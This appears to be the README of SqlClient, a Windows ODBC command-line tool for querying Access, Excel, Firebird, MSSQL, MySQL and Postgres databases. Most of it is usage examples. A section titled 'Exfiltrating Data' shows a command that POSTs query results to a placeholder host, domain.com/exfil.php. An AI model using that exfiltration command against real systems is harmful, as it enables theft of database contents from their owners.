# SqlClient

## Usage
```
Usage: SqlClient.exe <options>
        Required
                -d, --driver    ODBC Driver
                -u, --username  username
                -p, --password  password
                -i, --host      the host name of the server
                -c, --catalog   The catalog or database
                -s, --sql       The sql statement to execute.

        Optional
                -f, --filter    Used with schema requests to filter by column or table.
                -o, --output    Output type: csv,json
                -e, --url       url where data will be posted
```

## Features

SqlClient uses the installed ODBC drivers on a system to query local or remote databases.  The application will attempt to detect if the selected ODBC driver is installed, if it is not found, the program will exit, otherwise, the SQL statement will be executed.

#### Architecture Notes

Windows maintains two sets of ODBC drivers, x86 and x64.  It is not possible to access an x86 ODBC driver from a x64 process and vice-versa.

### Supported Applications
- Access
- Excel
- Firebird
- MSSQL
- MySql
- Postgres

---

## Example Usage

### Access
pass in an empty string for username, password and host.  The -c switch should be the full path to the access database.
```
SqlClient.exe -d access -u "" -p "" -i "" -c "C:\path\to\folder\file.accdb" -s "select * from clients" -o json
```

### Excel
pass in an empty string for username, password and host.  The -c switch should be the full path to the excel spreadsheet.
```
SqlClient.exe -d excel -u "" -p "" -i "" -c "C:\path\to\folder\file.xlsx" -s "select * from [clients$]" -o json
```

### Postgres
```
SqlClient.exe -d postgresql -u postgres -p PASSWORD -i 127.0.0.1 -c somedb -s "select * from clients" -o csv
```

### Firebird
```
SqlClient.exe -d firebird -u SYSDBA -p masterkey -i 127.0.0.1 -c somedb -s "select * from clients" -o csv
```

### Mysql
```
SqlClient.exe -d mysql -u root -p PASSWORD -i 127.0.0.1 -c somedb -s "select * from clients" -o csv
```

### MSSQL
```
SqlClient.exe -d mssql -u root -p PASSWORD -i 127.0.0.1 -c somedb -s "select * from clients" -o csv
```

---
## Exfiltrating Data
It is possible to exfiltrate data using the -e switch.  This will result in an HTTP POST where the body of the post is the output of the query.
```
SqlClient.exe -d mssql -u root -p PASSWORD -i 127.0.0.1 -c somedb -s "select * from clients" -o csv -e http://domain.com/exfil.php
```
---

## Schema Sub-Commands

#### Get tables
```
SqlClient.exe -d excel -u "" -p "" -i "" -c "C:\path\to\folder\file.xlsx" -s "schema:tables" -o json
```
#### Get columns
```
SqlClient.exe -d excel -u "" -p "" -i "" -c "C:\path\to\folder\file.xlsx" -s "schema:columns" -o json
```
#### Filter schema using Linq .Select()
```
SqlClient.exe -d excel -u "" -p "" -i "" -c "C:\path\to\folder\file.xlsx" -s "schema:columns" -f "COLUMN_NAME = 'city'" -o json
```
##### Table fields
- TABLE_CAT
- TABLE_SCHEM
- TABLE_NAME
- COLUMN_NAME
- DATA_TYPE
- TYPE_NAME
- COLUMN_SIZE
- BUFFER_LENGTH
- DECIMAL_DIGITS
- NUM_PREC_RADIX
- NULLABLE
- REMARKS
- COLUMN_DEF
- SQL_DATA_TYPE
- SQL_DATETIME_SUB
- CHAR_OCTET_LENGTH
- ORDINAL_POSITION
- IS_NULLABLE
- ORDINAL

##### Column fields
- TABLE_CAT
- TABLE_SCHEM
- TABLE_NAME
- TABLE_TYPE
- REMARKS